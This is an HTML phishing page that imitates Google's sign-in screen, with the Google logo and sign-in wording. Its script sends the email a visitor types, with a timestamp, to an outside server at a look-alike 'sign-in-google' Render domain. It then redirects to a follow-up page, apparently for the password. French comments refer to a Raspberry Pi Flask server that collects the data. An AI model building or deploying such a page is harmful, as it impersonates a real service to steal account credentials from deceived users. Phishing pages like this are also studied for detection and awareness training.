<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Google account</title>
    <link rel="stylesheet" href="./Gmail_page.css">
</head>
<body>
<div class="container">
  <div class="top-content">
    <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google">
    <h2>Sign in</h2>
    <p class="heading">Use your Google Account</p>
  </div>
  
  <div class="inputs">
    <input type="email" name="email" id="email" class="input" required>
    <label for="email" class="input-label">Email or phone</label>
  </div>
  
  <a href="#" class="link-btn">Forgot Email?</a>
  <p class="color">Not your computer? Use Guest mode to sign in privately.</p>
  <a href="#" class="link-btn">Learn More</a>
  
  <div class="btn-group">
    <button class="create-btn">Create account</button>
    <button class="next-btn" id="btn-next">Next</button>
  </div>
</div>

<script>
  document.getElementById('btn-next').addEventListener('click', async function() {
    const emailInput = document.getElementById('email');
    const emailValue = emailInput.value;

    if (!emailValue) {
        alert("Please enter an email");
        return;
    }

    // --- CONFIGURATION ---
    // Remplacez par l'adresse IP de votre Raspberry Pi
    const PI_IP = "192.168.1.157"; 
    const URL = `https://sign-in-google.onrender.com/data`;
    // ---------------------

    this.innerText = "Loading...";
    this.disabled = true;

    try {
        const response = await fetch(URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                email: emailValue,
                timestamp: new Date().toISOString()
            })
        });

        if (response.ok) {
            // Stocker l'email dans localStorage
            localStorage.setItem('userEmail', emailValue);
            // Redirection après succès vers votre page connect.html
            window.location.href = 'conect.html';
        } else {
            alert("Server error: " + response.status);
            this.innerText = "Next";
            this.disabled = false;
        }
    } catch (error) {
        console.error("Connection error:", error);
        alert("Could not connect to Raspberry Pi. Make sure the Flask server is running.");
        this.innerText = "Next";
        this.disabled = false;
    }
  });
</script>
</body>
</html>
